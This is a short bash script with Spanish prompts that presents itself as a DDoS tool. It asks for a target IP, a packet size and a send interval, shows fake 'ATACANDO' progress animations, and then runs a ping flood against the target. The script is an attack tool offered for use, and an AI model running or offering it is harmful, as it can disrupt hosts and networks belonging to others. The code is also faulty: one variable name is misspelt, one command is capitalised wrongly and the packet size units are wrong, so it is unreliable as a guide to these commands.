clear
echo ;
echo "Ingrese Direccion Ip "
echo ;echo "<--->"
echo ;read -p "> " DDOSIP
echo ;echo "<--->"
echo ;echo "Ingrese tamaño del paquete ( TAMAÑO MB DE ENVIO )"
echo "(Recomendable ' 8000 ' )"
echo ;read -p "> " SIZEPACKEGES
for i in {1..5}; do
     echo "Espere."
     sleep 0.5
     clear 
     echo "Espere.."
     sleep 0.5
     clear 
     echo "Espere..."
     sleep 0.5
     clear
done

echo "Done!"
echo ;
echo "<--->"
echo ;echo "Seleccione la velocidad."
echo "-> [0.0001] RAPIDO (recomendado) | [0.001] MEDIO | [0.2] LENTO (para pruebas normales)"
echo ;read -p "> " festdelay

for i in {1..5}; do
    echo "[SERVICE]Iniciando."
    sleep 0.5
    clear 
    echo "[SERVICE]Iniciando.."
    sleep 0.5
    clear
    echo "[SERVICE]Iniciando..."
    sleep 0.5
    clear
done
Clear 
sleep 2
for i in {1..5}; do
      echo "[SERVICE]> ATACANDO."
      sleep 0.5
      clear
      echo "[SERVICE]> ATACANDO.."
      sleep 0.5
      clear
      echo "[SERVICE]> ATACANDO..."
      sleep 0.5
      clear
done

ping "$DDOSIP" -s "$SIZEPACKEGES" -i "$fastdelay"